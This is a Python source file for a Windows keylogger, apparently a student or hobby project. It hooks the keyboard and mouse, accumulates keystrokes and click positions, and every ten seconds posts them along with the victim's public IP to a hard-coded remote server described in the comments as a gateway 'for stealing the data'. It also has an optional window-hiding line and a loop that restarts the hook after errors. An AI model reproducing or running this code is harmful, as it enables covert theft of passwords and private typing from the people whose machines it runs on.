#Written by Eshed Sorotsky & Shilat Tsfoni
from typing_extensions import final
from wsgiref import headers
import win32api
import win32console
import win32gui
import pythoncom, pyHook
import requests
import datetime

#getting the current window the app is running
myWindow = win32console.GetConsoleWindow()
#hiding it from the user
#win32gui.ShowWindow(myWindow, 0)

#variable holding the global stream
dataStream = ""
#api gateway for stealing the data
#apiUrl = 'http://127.0.0.1:8000/api/sendData/'
apiUrl = 'http://3.17.7.99/api/sendData/'

#for sending data at 10 second intervals (can be changed)
start_time = datetime.datetime.now()
#getting the current pc's IP
ip = requests.get(r'http://jsonip.com').json()['ip']
#checks time and if it hits 10 seconds activates sendData and resets the timer
def checkTime():
    global start_time
    curr_time = datetime.datetime.now()
    check = curr_time - start_time
    if check.seconds ==10:
        sendData()
        start_time = datetime.datetime.now()
#sends data using the API gateway
def sendData():
    global dataStream
    global apiUrl
    global ip
    def jParse(data):
        return {'source':ip,
        'stream':data,
        }
    request = requests.post(url = apiUrl,data = jParse(dataStream))
    #resets the datastream after every post made to the server
    dataStream = ""
#parses the mouse click event and adds it to the datastream
def mouseClick(event):
    global dataStream
    mouseLog = 'Clicked at {0}'.format(event.Position)
    dataStream +='\n'+mouseLog
    checkTime()
    return 1
#parses the keystroke event and adds it to the datastream
def keyStrokes(event):
    global dataStream
    #if we hit escape will stop the keylogger
    if event.Ascii==27:
        #if the ASCII value is 05 (Enquiry)
        exit(1)
    if event.Ascii !=0 or 8:
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        dataStream += keylogs
    checkTime()
    return 1
# create a hook manager object
def looponevents():
    keyhookObject = pyHook.HookManager()
    #so that when a keydown action is performed sends the event to our function
    keyhookObject.KeyDown = keyStrokes
    #so when a mouse is clicked will send the event to our function
    keyhookObject.MouseAllButtonsDown = mouseClick
    # set the hook
    keyhookObject.HookKeyboard()
    keyhookObject.HookMouse()
    pythoncom.PumpMessages()
#looping so if we get an error the keylogger wont stop
while(True):
    try:
        looponevents()
    except:
        looponevents()